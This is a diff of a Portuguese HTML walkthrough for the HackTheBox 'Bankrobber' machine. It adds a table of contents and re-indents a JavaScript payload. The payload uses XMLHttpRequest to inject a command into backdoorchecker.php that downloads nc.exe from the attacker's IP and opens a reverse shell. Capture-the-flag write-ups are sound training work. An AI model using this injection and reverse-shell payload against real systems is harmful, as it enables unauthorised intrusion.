@@ -160,7 +160,21 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p><img src="Assets/HTB-Windows-Insane-Bankrobber/icon.webp" alt="" /></p>
+                        <ol>
+<li><a href="#resolu%C3%A7%C3%A3o-da-m%C3%A1quina-bankrobber">Resolução da máquina <strong>Bankrobber</strong></a> 1. <a href="#m%C3%A1quina-insane-hacktheboxcom">Máquina INSANE (hackthebox.com)</a> 2. <a href="#by-javalimz---13092021">by <strong><em>JavaliMZ</em></strong> - 13/09/2021</a></li>
+<li><a href="#enumera%C3%A7%C3%A3o">Enumeração</a>
+<ol>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#website">WebSite</a></li>
+<li><a href="#sqli">SQLi</a></li>
+<li><a href="#notetxt">note.txt</a></li>
+<li><a href="#sqli-into-rce">SQLi into RCE</a></li>
+<li><a href="#visualiza%C3%A7%C3%A3o-do-ficheiro-backdoorcheckerphp">Visualização do ficheiro backdoorchecker.php</a></li>
+</ol>
+</li>
+<li><a href="#privesc">PrivEsc</a></li>
+</ol>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/icon.webp" alt="" /></p>
 <img src="https://img.shields.io/badge/Bankrobber-HackTheBox-green?style=plastic" width="200">
 <h1 id="resolução-da-máquina-bankrobber"><a class="header" href="#resolução-da-máquina-bankrobber">Resolução da máquina <strong>Bankrobber</strong></a></h1>
 <h4 id="máquina-insane-hacktheboxcom"><a class="header" href="#máquina-insane-hacktheboxcom">Máquina INSANE (hackthebox.com)</a></h4>
@@ -296,7 +310,7 @@ request.send()
 </ul>
 <pre><code class="language-javascript">var request = new XMLHttpRequest()
 params =
-	'cmd=dir|powershell -c &quot;IWR -Uri http://10.10.14.9/nc.exe -OutFile %temp%\\nc.exe&quot;; %temp%\\nc.exe -e cmd 10.10.14.9 443'
+    'cmd=dir|powershell -c &quot;IWR -Uri http://10.10.14.9/nc.exe -OutFile %temp%\\nc.exe&quot;; %temp%\\nc.exe -e cmd 10.10.14.9 443'
 request.open('POST', 'http://localhost/admin/backdoorchecker.php', true)
 request.setRequestHeader('content-type', 'application/x-www-form-urlencoded')
 request.send(params)
